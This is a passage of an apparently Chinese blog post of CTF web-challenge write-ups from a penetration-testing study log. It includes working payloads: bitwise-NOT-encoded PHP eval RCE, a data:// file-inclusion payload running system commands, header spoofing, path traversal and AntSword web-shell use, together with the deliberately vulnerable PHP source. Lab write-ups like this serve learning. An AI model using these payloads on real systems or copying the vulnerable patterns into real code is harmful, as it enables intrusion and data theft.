&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;玄轨连接中断！请检查灵枢...&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过在控制台发送信息来得到flag</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=S&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;flowing_azure_clouds&#x27;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;篡改成功！Flag为：&quot;</span>, data.<span class="property">flag</span>);</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨`</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;篡天失败：&quot;</span>, err));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A03.png" alt="1"></p>
+<h3 id="第十二章-玉魄玄关·破妄"><a href="#第十二章-玉魄玄关·破妄" class="headerlink" title="第十二章 玉魄玄关·破妄"></a>第十二章 玉魄玄关·破妄</h3><p>用蚁剑，先右键添加数据，输入ip和端口，测试链接，再点击添加就成功了，密码是cmd</p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A012.1.png" alt="1"></p>
+<p>flag应该就藏在某个文件夹里面，反正我没找到，以后再看看。找到了在环境变量里面。</p>
+<h3 id="第五章-打上门来！"><a href="#第五章-打上门来！" class="headerlink" title="第五章 打上门来！"></a>第五章 打上门来！</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure>
+
+<p>..&#x2F;可以返回上级目录</p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/5.1.png" alt="1"></p>
+<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.1.png" alt="1"></p>
+<p>用F12查看到Secret.php</p>
+<p>访问Secret.php</p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.2.png" alt="1"></p>
+<p>用bp</p>
+<p>header中添加上 <code>Referer:https://www.Sycsecret.com</code></p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.4.png" alt="1"></p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.3.png" alt="1"></p>
+<p>修改 User-Agent 为<code>User-Agent: Syclover</code></p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.5.png" alt="1"></p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.6.png" alt="1"></p>
+<p>127.0.0.1,所以我们可以利用<code>X-Forwarded-For</code>协议来伪造只需要在 header 添加 <code>X-Forwarded-For:127.0.0.1</code>，再次访问</p>
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/6.7.png" alt="1"></p>
+<h3 id="NSSCTF-hardrce"><a href="#NSSCTF-hardrce" class="headerlink" title="NSSCTF hardrce"></a>NSSCTF hardrce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];<span class="comment">//对wllm内容进行限制，过滤掉一下的特殊字符</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>)) <span class="comment">//进行正则匹配，过滤掉大小写字母</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); <span class="comment">//执行wllm，说明存在远程代码执行漏洞</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> 蔡总说：注意审题！！！</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.jyshare.com/compile/11/">php在线运行网站</a></p>
+<p>取反符号 ‘ ~ ‘</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;ls /&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%93%8C%DF%D0</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>
+
+<p>继续</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%8C%86%8C%8B%9A%92</span><br><span class="line">%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？NSSCTF&#123;<span class="number">47638</span>a22-<span class="number">222</span>b-<span class="number">4171</span>-a5bd-<span class="number">890458</span>f414a7&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第十六章-昆仑星途"><a href="#第十六章-昆仑星途" class="headerlink" title="第十六章 昆仑星途"></a>第十六章 昆仑星途</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>文件包含漏洞</p>
+<p>使用 PHP 封装器</p>
+<table>
+<thead>
+<tr>
+<th>Wrapper</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://input</code></td>
+<td>读取 POST 数据，可执行代码</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td>数据流过滤，用于读取文件源码</td>
+</tr>
+<tr>
+<td><code>php://memory</code> &#x2F; <code>php://temp</code></td>
+<td>内存数据流</td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>数据 URI，可嵌入代码</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>执行系统命令（极少见）</td>
+</tr>
+</tbody></table>
+<p>payload1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls -la /&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;); total 68 drwxr-xr-x 1 root root 4096 Sep 4 00:52 . drwxr-xr-x 1 root root 4096 Sep 4 00:52 .. lrwxrwxrwx 1 root root 7 May 12 19:25 bin -&gt; usr/bin drwxr-xr-x 2 root root 4096 May 12 19:25 boot drwxr-xr-x 5 root root 360 Sep 4 00:52 dev -rwxr-xr-x 1 root root 118 Aug 20 12:43 entrypoint.sh drwxr-xr-x 1 root root 4096 Sep 4 00:52 etc -rw-r--r-- 1 root root 45 Sep 4 00:52 flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt drwxr-xr-x 2 root root 4096 May 12 19:25 home lrwxrwxrwx 1 root root 7 May 12 19:25 lib -&gt; usr/lib lrwxrwxrwx 1 root root 9 May 12 19:25 lib64 -&gt; usr/lib64 drwxr-xr-x 2 root root 4096 Aug 11 00:00 media drwxr-xr-x 2 root root 4096 Aug 11 00:00 mnt drwxr-xr-x 2 root root 4096 Aug 11 00:00 opt dr-xr-xr-x 441 root root 0 Sep 4 00:52 proc drwx------ 2 root root 4096 Aug 11 00:00 root drwxr-xr-x 1 root root 4096 Sep 4 00:52 run lrwxrwxrwx 1 root root 8 May 12 19:25 sbin -&gt; usr/sbin drwxr-xr-x 2 root root 4096 Aug 11 00:00 srv dr-xr-xr-x 13 root root 0 Aug 18 11:39 sys drwxrwxrwt 1 root root 4096 Sep 4 00:52 tmp drwxr-xr-x 1 root root 4096 Aug 11 00:00 usr drwxr-xr-x 1 root root 4096 Aug 12 22:26 var .php</span><br></pre></td></tr></table></figure>
+
+<p>看到flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-P9Mo56YCMkjhEzXSqnmPZ9sWCudQTs.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第四章-金曦破禁与七绝傀儡阵"><a href="#第四章-金曦破禁与七绝傀儡阵" class="headerlink" title="第四章 金曦破禁与七绝傀儡阵"></a>第四章 金曦破禁与七绝傀儡阵</h3><p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.0.png" alt="1"></p>
+<p>抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /stone_golem HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>使用GET方法传递参数 key&#x3D;xdsec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /stone_golem?key=xdsec HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1:bW9lY3Rme0Mw</span><br><span class="line">&lt;a href=&quot;/cloud_weaver&quot;&gt;前往第二关：织云傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.1.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /cloud_weaver HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:61709</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">declaration=%E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag2: bjZyNDd1MTQ3  </span><br><span class="line"> &lt;a href=&quot;/shadow_stalker&quot;&gt;前往第三关：溯源傀儡&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/4.2.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /shadow_stalker HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:65093</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: 